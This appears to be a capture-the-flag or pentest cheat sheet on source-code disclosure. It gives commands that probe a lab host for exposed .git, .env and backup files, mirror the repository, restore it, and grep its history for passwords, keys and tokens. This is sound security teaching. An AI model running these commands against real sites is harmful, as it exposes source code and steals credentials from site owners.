# Source Code Disclosure

Server-side source is the strongest thing a web application can give you short of a shell. It names the parameters, shows the queries, prints the credentials, and turns every other technique in this folder from guessing into reading. This note is about the routes that hand it to you: a version-control directory deployed to the webroot, a backup file left beside the original, and the history behind both.

The most valuable part is usually not the current code. A secret removed from the working tree lives on in the repository's history, and an editor backup preserves the version from before somebody fixed something.

## Probe for the paths that leak source

```bash
for p in .git/HEAD .git/config .svn/entries .DS_Store .env composer.json \
         index.php.bak index.php~ index.php.swp backup.zip web.config.bak; do
  printf '%-24s %s\n' "$p" "$(curl -s -o /dev/null -w '%{http_code} %{size_download}' http://target.thm/$p)"
done
```

- `.git/HEAD` → the cheapest and most decisive probe. It is a tiny file with fixed contents (`ref: refs/heads/master`), so its response is unambiguous in a way that `/.git/` is not
- request specific **files**, not the directory → many servers block directory listing while serving the files inside it happily. A 403 on `/.git/` with a 200 on `/.git/HEAD` is the common and entirely exploitable case, and stopping at the 403 is how the finding gets missed
- `~` and `.swp` → editor leftovers. `index.php~` is emacs, `.index.php.swp` is vim, and both are served as plain text because the server has no handler for the extension
- `.bak`, `.old`, `.orig`, `.save`, `.txt` appended to a known filename → the same idea. Take filenames from the sweep you already ran rather than from a wordlist
- printing status **and size** → a 200 with size 0 is not a hit, and a 404 page is often served with a 200. Both numbers together are what tell you

## Mirror the repository

```bash
wget -r -l inf -np -R 'index.html*' http://target.thm/.git/
```

- `-r` → recursive; it follows links, which is why this needs directory listing enabled
- `-l inf` → removes wget's **default depth limit of 5**. Git's `objects/` tree is deeper than that, so without this you mirror a partial repository that fails to check out with an error about a missing object — which reads like a broken download rather than a truncated one
- `-np` → no parent: stops wget climbing above `/.git/` and mirroring the entire website
- `-R 'index.html*'` → discards the generated directory-listing pages, which are not part of the repository and clutter the result
- output lands in a directory named after the host. `cd` into it; the `.git` subdirectory sits there, so git treats that directory as the repository root

## Validate and restore the working tree

```bash
git status
```

```bash
git restore .
```

```bash
ls -la
```

- `git status` → the validation. Branch and file information means the download is intact; `not a git repository` means the mirror is incomplete or you are in the wrong directory
- files listed as `deleted` is **expected and correct**. Only `.git` was mirrored, so the working tree is empty and git is comparing HEAD against nothing. Reading that as a failed download is the standard wrong turn here
- `git restore .` → repopulates every tracked file from HEAD at once. `git restore README.md` for a single file
- `ls -la` → include hidden files. `.env` is hidden, and it is usually the one you want

## Mine the history

```bash
git log --oneline --all
```

```bash
git show <hash>
```

```bash
git log -p | grep -niE 'password|secret|api[_-]?key|token|BEGIN [A-Z ]*PRIVATE KEY'
```

```bash
git show <hash>:path/to/file
```

- `--all` → every branch and ref, not just the current one. A deleted secret often survives on an abandoned branch, and without this flag you never see it
- `-p` → include the full patch for every commit, which is what makes the `grep` above search content rather than commit messages
- `-i` on the grep → case matters more than you would think; `Password` and `API_KEY` are as common as the lowercase forms
- `git show <hash>:path` → read a file exactly as it was at one commit, without writing anything to disk or changing your working tree
- `git diff <a> <b>` → isolate what changed between two commits, which is how you find the commit that removed a credential
- read the commit **messages** first: `remove password`, `fix config`, `cleanup`, `oops`, `revert` are signposts pointing at the commit that contains the thing that was removed
